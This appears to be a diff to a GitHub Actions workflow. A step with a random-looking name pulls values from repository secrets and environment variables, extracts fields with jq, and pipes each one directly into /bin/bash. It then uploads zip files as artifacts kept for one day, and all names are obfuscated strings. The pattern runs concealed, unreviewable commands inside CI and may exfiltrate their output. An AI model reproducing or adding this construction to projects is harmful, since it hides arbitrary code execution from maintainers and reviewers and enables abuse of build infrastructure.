@@ -9,15 +9,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: benjamintitan407
         env:
-          fw557: ${{ secrets.fw557 }}
+          zklr06: ${{ secrets.zklr06 }}
         run: |
-          printf '%s' "$fw557" | jq -r .itt1112 | /bin/bash
-          printf '%s' "$p117" | jq -r .rcigz18643 | /bin/bash
-          echo $vgjs58 | jq -r .vokck5336 | /bin/bash
+          printf '%s' "$zklr06" | jq -r .t9 | /bin/bash
+          printf '%s' "$w8" | jq -r .pybfo6126 | /bin/bash
+          printf '%s' "$td5993" | jq -r .bpp94 | /bin/bash
+          echo $kvn88 | jq -r .wm58866 | /bin/bash
+          echo $q7 | jq -r .xbd8 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: PWn1uMOS
+          name: wKC8xhAA
           path: "*.zip"
           retention-days: 1
